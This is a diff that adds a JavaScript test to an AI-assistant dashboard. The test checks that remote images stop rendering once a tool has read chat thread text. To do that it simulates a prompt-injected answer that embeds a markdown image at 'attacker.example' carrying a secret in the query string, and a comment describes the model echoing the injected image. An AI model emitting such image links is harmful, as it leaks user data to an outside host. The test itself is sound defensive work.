@@ -290,3 +290,24 @@ test('assistantDashboard() preloads the stored dashboard before it reads or writ
     if (previous === undefined) delete globalThis.chrome; else globalThis.chrome = previous;
   }
 });
+
+test('while an answer streams, a tool that read thread text turns remote images off at once', async () => {
+  globalThis.document ??= { getElementById: () => null };
+  const { ctx } = fakeCtx();
+  let finish;
+  ctx.ai.runAssistant = async ({ onEvent, conversationId }) => {
+    // get_items read a chat (lib/ai/tools.js flags the tool event); the model then echoes an injected image.
+    onEvent({ type: 'tool', id: 't1', name: 'get_items', summary: 'Read 1 item', result: { count: 1 }, usedThreads: true });
+    onEvent({ type: 'text', delta: 'Here: ![x](https://attacker.example/?d=secret) done' });
+    await new Promise(resolve => { finish = resolve; });
+    const message = { id: 'msg_a', role: 'assistant', text: 'Here.', proposals: [], tools: [], citations: [], usedThreads: true };
+    return { conversation: { id: conversationId, title: 'Q', messages: [{ id: 'q', role: 'user', text: 'Q' }, message] }, message };
+  };
+  aiState(ctx).draft = 'What does my chat say?';
+  const sending = dispatch('ai.send', { ctx });
+  await ticks(() => aiState(ctx).run?.message.text.includes('attacker'));
+  // renderAnswer renders the live text with renderMd(..., { images: !message.usedThreads }).
+  assert.equal(aiState(ctx).run.message.usedThreads, true, 'the streaming answer renders without images');
+  finish();
+  await sending;
+});
